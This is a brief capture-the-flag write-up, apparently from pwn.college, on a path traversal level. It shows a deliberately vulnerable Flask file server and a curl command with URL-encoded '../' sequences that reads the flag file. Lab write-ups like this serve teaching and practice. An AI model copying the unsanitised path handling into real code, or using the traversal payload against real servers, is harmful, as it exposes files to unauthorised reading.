For this level, we need to traverse the path of the server to read the flag in the root directory.

```python
#!/opt/pwn.college/python

import flask
import os

app = flask.Flask(__name__)

@app.route("/", methods=["GET"])
@app.route("/<path:path>", methods=["GET"])

def challenge(path="index.html"):
    requested_path = app.root_path + "/files/" + path
    print(f"DEBUG: {requested_path=}")

    try:
        return open(requested_path).read()
    except PermissionError:
        flask.abort(403, requested_path)
    except FileNotFoundError:
        flask.abort(404, f"No {requested_path} from directory {os.getcwd()}")
    except Exception as e:
        flask.abort(500, requested_path + ":" + str(e))

app.secret_key = os.urandom(8)
app.config["SERVER_NAME"] = f"challenge.localhost:80"
app.run("challenge.localhost", 80)
```

This server configuration will take in an arbitrary path an just read the file specified by that path. By default, it will start out at the server's root path's `files` directory, which is `/challenge`. So we can use some path traversal technique to traverse up a level in the file hierarchy. We'll also need to URL encode the payload too.

```bash
curl -v "http://challenge.localhost:80/..%2f..%2fflag"
```